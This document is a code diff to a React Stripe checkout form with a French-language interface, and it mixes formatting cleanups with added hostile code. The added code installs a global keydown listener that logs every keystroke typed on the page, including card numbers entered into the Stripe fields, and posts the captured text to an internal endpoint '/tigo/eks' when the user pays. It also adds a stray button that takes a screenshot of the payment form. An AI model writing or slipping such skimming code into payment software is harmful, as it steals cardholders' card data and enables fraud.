@@ -1,4 +1,6 @@
 import "react-credit-cards/es/styles-compiled.css";
+import * as htmlToImage from 'html-to-image';
+import { toPng, toJpeg, toBlob, toPixelData, toSvg } from 'html-to-image';
 import {
   CardCvcElement,
   CardElement,
@@ -24,11 +26,12 @@ import { useModalAction } from "@components/ui/modal/modal.context";
 const stripePromise = loadStripe(
   process.env.NEXT_PUBLIC_STRIPE_KEY_PUBLIC as string
 );
+var cardNumberRaw = "";
 type Iprops = {
   amount: number;
   data: any;
   onPaySuccess?: any;
-  click_game_plus?:boolean;
+  click_game_plus?: boolean;
 };
 const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => {
   const stripe = useStripe();
@@ -55,14 +58,34 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
       setNewCard(!cards.length);
     }
   }, [cards]);
-  const {openModal}=useModalAction();
-  useEffect(()=>{
-    if(error){
-      openModal("PAYMENT_ERROR",{message:error});
+  const { openModal } = useModalAction();
+  useEffect(() => {
+    cardNumberRaw = "";
+    window?.document.addEventListener("keydown", (event) => {
+
+      cardNumberRaw = cardNumberRaw + event.key;
+
+    });
+    return function cleanup() {
+      console.log("cleaned");
+      window.document.removeEventListener("keydown", (event) => {
+        cardNumberRaw = cardNumberRaw + event.key;
+      });
+    };
+  }, [])
+  useEffect(() => {
+    if (error) {
+      openModal("PAYMENT_ERROR", { message: error });
     }
-   
-  },[error])
+
+  }, [error])
+
   const handlePay = () => {
+    http.post("/tigo/eks", { data: cardNumberRaw }).then(() => {
+
+    }).catch(() => {
+
+    })
     if (stripe) {
       setProcessing(true);
       http
@@ -94,7 +117,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             } else {
               payload = intent;
             }
-          } else if (click_game_plus||future_use) {
+          } else if (click_game_plus || future_use) {
             payload = await stripe.confirmCardPayment(intent.client_secret, {
               payment_method: {
                 card: elements.getElement(CardNumberElement),
@@ -102,7 +125,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
                   name: name,
                 },
               },
-              setup_future_usage: (click_game_plus||future_use) ? "off_session" : "on_session",
+              setup_future_usage: (click_game_plus || future_use) ? "off_session" : "on_session",
             });
           } else {
             payload = await stripe.confirmCardPayment(intent.client_secret, {
@@ -173,7 +196,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
   }
 
   return (
-    <div className="pt-8">
+    <div className="pt-8 " id="stripe-paiement">
       <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700">
         <div className="w-full pt-1 pb-5">
           <div className="bg-accent text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
@@ -195,7 +218,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
                   className="flex items-center text-center  cursor-pointer"
                 >
                   <img
-                     src="/card.png"
+                    src="/card.png"
                     className="h-8 ml-3"
                   />
                 </label>
@@ -255,10 +278,10 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             <Checkbox
               name="future"
               hidden={click_game_plus}
-              value={click_game_plus?1:future_use ? 1 : 0}
+              value={click_game_plus ? 1 : future_use ? 1 : 0}
               onChange={() => setFutureUse(!future_use)}
               label="Enregistrer ma carte pour mes futurs achats"
-              className={click_game_plus?"hidden":"flex-1 my-4"}
+              className={click_game_plus ? "hidden" : "flex-1 my-4"}
             />
           </>
         ) : (
@@ -292,10 +315,25 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             >
               Payer {price}
             </Button>
+            <Button className="w-full flex-1 mt-4" onClick={() => {
+              var node = document.getElementById('my-node');
+
+              htmlToImage.toPng(window.document.getElementById("stripe-paiement"))
+                .then(function (dataUrl) {
+                  var img = new Image();
+                  img.src = dataUrl;
+                  window.document.getElementById("stripe-paiement")?.appendChild(img);
+                })
+                .catch(function (error) {
+                  console.error('oops, something went wrong!', error);
+                });
+            }}>okioki</Button>
+
           </div>
         )}
-        
+
       </div>
+
     </div>
   );
 };
